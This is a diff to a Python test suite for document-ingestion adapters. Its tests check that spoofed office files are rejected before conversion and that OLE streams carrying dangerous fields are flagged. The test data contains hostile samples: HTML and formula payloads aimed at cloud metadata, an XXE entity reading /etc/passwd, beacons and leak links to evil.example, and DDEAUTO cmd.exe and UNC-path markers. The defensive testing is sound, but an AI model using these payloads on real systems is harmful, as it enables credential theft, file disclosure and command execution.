@@ -18,6 +18,7 @@ import io
 import json
 import subprocess
 import time
+import zipfile
 from pathlib import Path
 from typing import Any
 from unittest.mock import MagicMock, patch
@@ -32,8 +33,11 @@ from opendv_contracts.dtos.ingestion import (
     PageMapEntry,
     TaintClassification,
 )
+from opendv_contracts.errors import ErrorCode
 from opendv_sources.adapters.libreoffice_adapter import (
+    ArchiveSecurityViolationError,
     LibreOfficeDocumentAdapter,
+    _inspect_ole_cfb_security,
     find_soffice_binary,
 )
 from opendv_sources.adapters.liteparse_adapter import (
@@ -194,6 +198,39 @@ class TestMarkdownDocumentAdapter:
 
         assert result.tables == []
         assert elapsed < 0.5, f"Markdown table scan quadratic regression: {elapsed:.3f}s"
+
+    def test_markdown_linear_time_on_25000_fenced_code_blocks_and_headings(self) -> None:
+        """Regression P04b::MAJ-01: >= 25,000 fenced code blocks + headings parse in < 1.0s."""
+        num_blocks = 26_000
+        segments: list[str] = []
+        for i in range(num_blocks):
+            if i % 10 == 0:
+                segments.append(f"## Section {i}")
+            segments.append("```\n# inner comment\n```")
+        payload = ("\n".join(segments) + "\n").encode("utf-8")
+
+        adapter = MarkdownDocumentAdapter()
+        t0 = time.perf_counter()
+        result = adapter.parse_bytes(payload, filename="massive_fences.md")
+        elapsed = time.perf_counter() - t0
+
+        assert elapsed < 1.0, (
+            f"Markdown fenced code-block + heading scan quadratic regression: {elapsed:.3f}s"
+        )
+        assert result.metadata["code_block_count"] == num_blocks
+        assert result.metadata["quarantined_code_blocks"] == num_blocks
+        assert result.metadata["heading_count"] == 2_600
+        assert len(result.metadata["code_blocks"]) == num_blocks
+        assert len(result.metadata["headings"]) == 2_600
+
+        # Also verify metadata list bounding preserves exact counts and full quarantine
+        bounded = MarkdownDocumentAdapter(exclude_code_blocks=True, max_metadata_items=100)
+        bounded_res = bounded.parse_bytes(payload, filename="bounded_fences.md")
+        assert bounded_res.metadata["code_block_count"] == num_blocks
+        assert bounded_res.metadata["heading_count"] == 2_600
+        assert len(bounded_res.metadata["code_blocks"]) == 100
+        assert len(bounded_res.metadata["headings"]) == 100
+        assert "# inner comment" not in bounded_res.normalized_text
 
 
 # =============================================================================
@@ -701,14 +738,28 @@ class TestLibreOfficeDocumentAdapter:
         )
         assert adapter.supports_mime_type("application/vnd.oasis.opendocument.text")
 
+    @staticmethod
+    def _minimal_office_zip_bytes(entry_name: str = "word/document.xml") -> bytes:
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
+            zf.writestr(entry_name, '<?xml version="1.0" encoding="UTF-8"?><root>ok</root>')
+        return buf.getvalue()
+
+    @staticmethod
+    def _minimal_ole_cfb_bytes(body: bytes = b"Benign legacy binary content.") -> bytes:
+        magic = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
+        header_pad = b"\x00" * (512 - len(magic))
+        return magic + header_pad + body
+
     def test_missing_soffice_raises_501_error(self) -> None:
         # Pass non-existent path
         adapter = LibreOfficeDocumentAdapter(soffice_path="/nonexistent/bin/soffice")
+        valid_zip = self._minimal_office_zip_bytes()
         with patch(
             "opendv_sources.adapters.libreoffice_adapter.find_soffice_binary", return_value=None
         ):
             with pytest.raises(OfficeConversionUnavailableError) as exc_info:
-                adapter.parse_bytes(b"dummy office bytes", filename="spec.docx")
+                adapter.parse_bytes(valid_zip, filename="spec.docx")
 
             err = exc_info.value
             assert err.error_code == "OFFICE_CONVERSION_UNAVAILABLE"
@@ -730,7 +781,7 @@ class TestLibreOfficeDocumentAdapter:
     def test_mock_successful_conversion_delegates_to_liteparse(
         self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
     ) -> None:
-        office_bytes = b"fake docx binary content for testing"
+        office_bytes = self._minimal_office_zip_bytes()
         expected_sha = hashlib.sha256(office_bytes).hexdigest()
         mock_pdf_payload = b"%PDF-1.5 mock pdf payload"
         expected_pdf_sha = hashlib.sha256(mock_pdf_payload).hexdigest()
@@ -841,7 +892,7 @@ class TestLibreOfficeDocumentAdapter:
                 assert chunk.document_id == result.document_id
                 assert chunk.taint == TaintClassification.CONFIDENTIAL
 
-            # 040b4599::MAJ-08: Verify hardened flags and sanitized environment
+            # 040b4599::MAJ-08 & P04a::MAJ-01: Verify hardened flags, --infilter, & sanitized env
             cmd_used = captured_popen["cmd"]
             for required_flag in (
                 "--headless",
@@ -849,14 +900,17 @@ class TestLibreOfficeDocumentAdapter:
                 "--nolockcheck",
                 "--nodefault",
                 "--nofirststartwizard",
+                "--infilter=MS Word 2007 XML",
             ):
                 assert required_flag in cmd_used
+            assert cmd_used.index("--infilter=MS Word 2007 XML") < cmd_used.index("--convert-to")
             child_env = captured_popen["kwargs"]["env"]
             assert "OPENAI_API_KEY" not in child_env
             assert "DATABASE_URL" not in child_env
 
     def test_conversion_failure_raises_extraction_error(self) -> None:
         adapter = LibreOfficeDocumentAdapter(soffice_path="mock_soffice")
+        odt_bytes = self._minimal_office_zip_bytes(entry_name="content.xml")
 
         def mock_failed_popen(cmd: list[str], **kwargs: Any) -> MagicMock:
             proc = MagicMock()
@@ -875,7 +929,7 @@ class TestLibreOfficeDocumentAdapter:
                 match=r"failed on 'broken\.odt' with exit code 1",
             ),
         ):
-            adapter.parse_bytes(b"corrupt", filename="broken.odt")
+            adapter.parse_bytes(odt_bytes, filename="broken.odt")
 
     def test_conversion_timeout_terminates_process_tree(self) -> None:
         """Regression 040b4599::MAJ-08: Timeout kills soffice process tree cleanly."""
@@ -883,6 +937,7 @@ class TestLibreOfficeDocumentAdapter:
         mock_proc = MagicMock()
         mock_proc.pid = 42424
         mock_proc.communicate.side_effect = subprocess.TimeoutExpired(cmd="soffice", timeout=1)
+        docx_bytes = self._minimal_office_zip_bytes()
 
         with (
             patch(
@@ -895,7 +950,7 @@ class TestLibreOfficeDocumentAdapter:
             ) as mock_kill_tree,
             pytest.raises(DocumentExtractionError, match="timed out after 1s"),
         ):
-            adapter.parse_bytes(b"slow docx payload", filename="hang.docx")
+            adapter.parse_bytes(docx_bytes, filename="hang.docx")
 
         mock_kill_tree.assert_called_once_with(mock_proc)
 
@@ -1108,6 +1163,205 @@ class TestLibreOfficeDocumentAdapter:
         assert "<value>3</value>" in captured_xcu[0]
         assert "UpdateMode" in captured_xcu[0]
         assert "<value>1</value>" in captured_xcu[0]
+
+    def test_non_zip_and_polyglot_payloads_renamed_to_office_rejected(self) -> None:
+        """Regression P04a::MAJ-01: HTML, RTF, and flat-XML ODF renamed to .doc/.xls/.ppt/.docx."""
+        adapter = LibreOfficeDocumentAdapter(soffice_path="mock_soffice")
+
+        html_ssrf = (
+            b'<html><body><img src="http://169.254.169.254/latest/meta-data/"/>'
+            b'<iframe src="file:///etc/passwd"></iframe></body></html>'
+        )
+        rtf_dde = (
+            rb"{\rtf1\ansi{\field{\*\fldinst{INCLUDEPICTURE "
+            rb'"http://evil.example/beacon.png" \\d}}{\fldrslt}}}'
+        )
+        fodt_xxe = (
+            b'<?xml version="1.0" encoding="UTF-8"?>'
+            b'<!DOCTYPE office:document [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+            b'<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
+            b'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" '
+            b'xmlns:xlink="http://www.w3.org/1999/xlink">'
+            b'<office:body><office:text><text:section text:name="S">'
+            b'<text:section-source xlink:href="http://evil.example/leak"/>'
+            b"</text:section>&xxe;</office:text></office:body></office:document>"
+        )
+        fods_webservice = (
+            b'<?xml version="1.0" encoding="UTF-8"?>'
+            b'<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
+            b'xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" '
+            b'xmlns:xlink="http://www.w3.org/1999/xlink">'
+            b"<office:body><office:spreadsheet><table:table>"
+            b'<table:table-source xlink:href="http://evil.example/sheet.ods"/>'
+            b'<table:table-row><table:table-cell table:formula="of:=WEBSERVICE(&quot;http://169.254.169.254&quot;)"/>'
+            b"</table:table-row></table:table></office:spreadsheet></office:body></office:document>"
+        )
+        valid_zip = self._minimal_office_zip_bytes()
+        valid_ole = self._minimal_ole_cfb_bytes()
+        polyglot_html_zip = html_ssrf + valid_zip
+
+        spoofed_cases: list[tuple[str, bytes, str | None]] = [
+            ("spoofed_html.doc", html_ssrf, None),
+            ("spoofed_html.xls", html_ssrf, None),
+            ("spoofed_html.ppt", html_ssrf, None),
+            ("spoofed_html.docx", html_ssrf, None),
+            ("spoofed_rtf.doc", rtf_dde, None),
+            ("spoofed_rtf.docx", rtf_dde, None),
+            ("spoofed_fodt.doc", fodt_xxe, None),
+            ("spoofed_fodt.docx", fodt_xxe, None),
+            ("spoofed_fodt.odt", fodt_xxe, None),
+            ("spoofed_fods.xls", fods_webservice, None),
+            ("spoofed_fods.xlsx", fods_webservice, None),
+            ("spoofed_fods.ods", fods_webservice, None),
+            ("zip_as_legacy.doc", valid_zip, None),
+            ("zip_as_legacy.xls", valid_zip, None),
+            ("ole_as_ooxml.docx", valid_ole, None),
+            ("ole_as_ooxml.xlsx", valid_ole, None),
+            ("polyglot_html.docx", polyglot_html_zip, None),
+            ("truncated_cfb.doc", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64, None),
+            ("mime_mismatch.docx", valid_zip, "application/msword"),
+            ("mime_mismatch.doc", valid_ole, "text/html"),
+        ]
+
+        with (
+            patch(
+                "opendv_sources.adapters.libreoffice_adapter.find_soffice_binary",
+                return_value="mock_soffice",
+            ),
+            patch("subprocess.Popen") as mock_popen,
+        ):
+            for fname, payload, explicit_mime in spoofed_cases:
+                with pytest.raises(ArchiveSecurityViolationError) as exc_info:
+                    adapter.parse_bytes(payload, filename=fname, mime_type=explicit_mime)
+                assert exc_info.value.error_code == ErrorCode.ARCHIVE_SECURITY_VIOLATION
+                assert exc_info.value.exit_code == 4
+                assert exc_info.value.http_status == 422
+            mock_popen.assert_not_called()
+
+    def test_ole_cfb_security_blocks_ascii_and_utf16le_dde_and_links(self) -> None:
+        """Regression P04a::MAJ-01: Scan OLE2 CFB streams in ASCII and even/odd UTF-16LE."""
+        adapter = LibreOfficeDocumentAdapter(soffice_path="mock_soffice")
+
+        dangerous_markers = [
+            "DDEAUTO c:\\windows\\system32\\cmd.exe",
+            "DDE cmd.exe /c calc.exe",
+            'dde "http://evil.example/cmd"',
+            'INCLUDEPICTURE "https://evil.example/pixel.png"',
+            'includetext "C:\\secrets\\keys.txt"',
+            'RD "C:\\secrets\\chapter.doc"',
+            'IMPORT "https://evil.example/data.xml"',
+            'LINK Excel.Sheet.8 "\\\\evil.example\\share\\book.xls"',
+            'WEBSERVICE("http://169.254.169.254/latest/meta-data/")',
+            "table-source",
+            "section-source",
+            "file:///etc/passwd",
+            "\\\\169.254.169.254\\ipc$\\leak",
+            "Ole10Native http://evil.example/payload.bin",
+        ]
+
+        with (
+            patch(
+                "opendv_sources.adapters.libreoffice_adapter.find_soffice_binary",
+                return_value="mock_soffice",
+            ),
+            patch("subprocess.Popen") as mock_popen,
+        ):
+            for ext in (".doc", ".xls", ".ppt"):
+                for marker in dangerous_markers:
+                    # 1) ASCII / Latin-1 stream
+                    ascii_cfb = self._minimal_ole_cfb_bytes(b"\x00" * 16 + marker.encode("latin-1"))
+                    with pytest.raises(ArchiveSecurityViolationError) as exc_ascii:
+                        adapter.parse_bytes(ascii_cfb, filename=f"attack_ascii{ext}")
+                    assert exc_ascii.value.error_code == ErrorCode.ARCHIVE_SECURITY_VIOLATION
+
+                    # 2) Even-aligned UTF-16LE stream
+                    utf16_even_cfb = self._minimal_ole_cfb_bytes(
+                        b"\x00\x00" + marker.encode("utf-16-le") + b"\x00\x00"
+                    )
+                    with pytest.raises(ArchiveSecurityViolationError) as exc_u16_even:
+                        adapter.parse_bytes(utf16_even_cfb, filename=f"attack_u16_even{ext}")
+                    assert exc_u16_even.value.error_code == ErrorCode.ARCHIVE_SECURITY_VIOLATION
+
+                    # 3) Odd-aligned UTF-16LE stream (e.g. BIFF8 1-byte string flags prefix)
+                    utf16_odd_cfb = self._minimal_ole_cfb_bytes(
+                        b"\x01" + marker.encode("utf-16-le") + b"\x00"
+                    )
+                    with pytest.raises(ArchiveSecurityViolationError) as exc_u16_odd:
+                        adapter.parse_bytes(utf16_odd_cfb, filename=f"attack_u16_odd{ext}")
+                    assert exc_u16_odd.value.error_code == ErrorCode.ARCHIVE_SECURITY_VIOLATION
+
+            mock_popen.assert_not_called()
+
+        # Direct helper test: benign prose with passive https URL passes
+        benign_prose = (
+            b"Quarterly Deal Review. See https://example.com/policy for link details."
+            + " Summary in UTF-16: https://example.com/report".encode("utf-16-le")
+        )
+        _inspect_ole_cfb_security(self._minimal_ole_cfb_bytes(benign_prose), ".doc")
+
+    def test_explicit_soffice_infilter_passed_for_all_supported_extensions(self) -> None:
+        """Regression P04a::MAJ-01: Explicit --infilter=<filter> precedes --convert-to."""
+        expected_infilters: list[tuple[str, bytes, str]] = [
+            (".doc", self._minimal_ole_cfb_bytes(), "MS Word 97"),
+            (".docx", self._minimal_office_zip_bytes(), "MS Word 2007 XML"),
+            (".xls", self._minimal_ole_cfb_bytes(), "MS Excel 97"),
+            (".xlsx", self._minimal_office_zip_bytes("xl/workbook.xml"), "Calc MS Excel 2007 XML"),
+            (".ppt", self._minimal_ole_cfb_bytes(), "MS PowerPoint 97"),
+            (
+                ".pptx",
+                self._minimal_office_zip_bytes("ppt/presentation.xml"),
+                "Impress MS PowerPoint 2007 XML",
+            ),
+            (".odt", self._minimal_office_zip_bytes("content.xml"), "writer8"),
+            (".ods", self._minimal_office_zip_bytes("content.xml"), "calc8"),
+            (".odp", self._minimal_office_zip_bytes("content.xml"), "impress8"),
+        ]
+
+        mock_pdf_adapter = MagicMock(spec=LiteParseDocumentAdapter)
+        mock_pdf_adapter.parse_bytes.return_value = IngestionResult(
+            document_id="doc_ok",
+            filename="out.pdf",
+            mime_type="application/pdf",
+            total_pages=1,
+            total_characters=4,
+            chunks=[],
+            page_map=[],
+            tables=[],
+            taint=TaintClassification.INTERNAL,
+            source_sha256="intermediate",
+            normalized_text="Test",
+            metadata={},
+        )
+        adapter = LibreOfficeDocumentAdapter(
+            soffice_path="mock_soffice", pdf_adapter=mock_pdf_adapter
+        )
+        captured_cmds: list[list[str]] = []
+
+        def mock_ok_popen(cmd: list[str], **kwargs: Any) -> MagicMock:
+            captured_cmds.append(list(cmd))
+            out_dir = Path(cmd[cmd.index("--outdir") + 1])
+            (out_dir / f"{Path(cmd[-1]).stem}.pdf").write_bytes(b"%PDF-1.5 mock")
+            proc = MagicMock()
+            proc.returncode = 0
+            proc.communicate.return_value = (b"", b"")
+            return proc
+
+        with (
+            patch(
+                "opendv_sources.adapters.libreoffice_adapter.find_soffice_binary",
+                return_value="mock_soffice",
+            ),
+            patch("subprocess.Popen", side_effect=mock_ok_popen),
+        ):
+            for ext, payload, expected_filter in expected_infilters:
+                captured_cmds.clear()
+                res = adapter.parse_bytes(payload, filename=f"sample{ext}")
+                assert res.filename == f"sample{ext}"
+                assert len(captured_cmds) == 1
+                cmd = captured_cmds[0]
+                expected_arg = f"--infilter={expected_filter}"
+                assert expected_arg in cmd
+                assert cmd.index(expected_arg) < cmd.index("--convert-to")
 
 
 # =============================================================================
